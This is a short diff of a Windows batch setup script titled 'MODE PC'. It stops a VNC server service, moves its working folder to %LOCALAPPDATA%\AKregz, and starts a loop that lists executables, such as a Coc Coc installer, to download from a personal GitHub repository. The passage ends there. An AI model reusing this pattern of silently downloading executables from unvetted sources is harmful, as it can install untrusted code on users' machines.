@@ -5,8 +5,9 @@ title MODE PC
 net stop vncserver /y
 sc stop vncserver /y
 
-MKDIR C:\AKregz
-cd C:\AKregz
+set DIR=%LOCALAPPDATA%\AKregz
+mkdir "%DIR%" 2>nul
+cd /d "%DIR%"
 
 for %%A in (
   "CoC.exe|https://raw.githubusercontent.com/KumisPutih7/Folder/main/files/CocCocSetup.exe"
